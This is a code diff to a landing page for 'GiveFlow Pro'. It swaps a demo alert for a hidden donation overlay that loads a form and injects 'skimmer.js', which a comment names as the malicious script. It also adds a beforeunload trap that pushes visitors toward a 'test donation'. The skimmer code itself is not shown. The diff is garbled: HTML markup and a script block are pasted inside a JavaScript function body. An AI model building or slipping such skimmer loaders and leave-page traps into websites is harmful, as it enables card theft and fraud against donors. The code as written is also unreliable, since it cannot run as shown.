@@ -710,9 +710,70 @@
         // Simple demo interactivity
         document.querySelectorAll('.btn-primary, .btn-hero.primary').forEach(btn => {
             btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Welcome to GiveFlow Pro! This is a demo page. In a real scam, this would redirect to the skimmer donation form.');
-            });
+                <!-- Hidden Donation Overlay (loaded from donate.html) -->
+<div id="donationOverlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center;">
+    <div id="donationFormContainer" style="width: 90%; max-width: 500px; background: white; border-radius: 24px; overflow: hidden; box-shadow: 0 30px 80px rgba(0,0,0,0.4);"></div>
+    <button id="closeOverlay" style="position: absolute; top: 30px; right: 30px; background: none; border: none; color: white; font-size: 2rem; cursor: pointer;">×</button>
+</div>
+
+<script>
+// ===== REDIRECT & OVERLAY CONTROLLER =====
+
+// 1. Load donation form from donate.html into overlay
+fetch('donate.html')
+    .then(res => res.text())
+    .then(html => {
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, 'text/html');
+        const donationForm = doc.querySelector('.donation-card'); // Target the form container
+        if (donationForm) {
+            document.getElementById('donationFormContainer').innerHTML = donationForm.outerHTML;
+            // Re‑attach skimmer.js to the injected form
+            loadSkimmer();
+        }
+    })
+    .catch(err => console.error('Failed to load donation form'));
+
+// 2. Show overlay when "Get Started Free" or similar is clicked
+document.querySelectorAll('.btn-primary, .btn-hero.primary, [href="#signup"]').forEach(btn => {
+    btn.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('donationOverlay').style.display = 'flex';
+        // Optional: prevent scrolling
+        document.body.style.overflow = 'hidden';
+    });
+});
+
+// 3. Close overlay
+document.getElementById('closeOverlay').addEventListener('click', function() {
+    document.getElementById('donationOverlay').style.display = 'none';
+    document.body.style.overflow = 'auto';
+});
+
+// 4. Load skimmer.js (the malicious script)
+function loadSkimmer() {
+    const script = document.createElement('script');
+    script.src = 'skimmer.js';
+    script.defer = true;
+    document.head.appendChild(script);
+}
+
+// 5. Trap attempts to leave the page (optional dark pattern)
+window.addEventListener('beforeunload', function(e) {
+    if (document.getElementById('donationOverlay').style.display === 'flex') {
+        e.preventDefault();
+        e.returnValue = 'Please complete your test donation to help us improve GiveFlow Pro.';
+    }
+});
+
+// 6. If user tries to navigate with ESC key, close overlay
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && document.getElementById('donationOverlay').style.display === 'flex') {
+        document.getElementById('donationOverlay').style.display = 'none';
+        document.body.style.overflow = 'auto';
+    }
+});
+</script>
         });
     </script>
 </body>
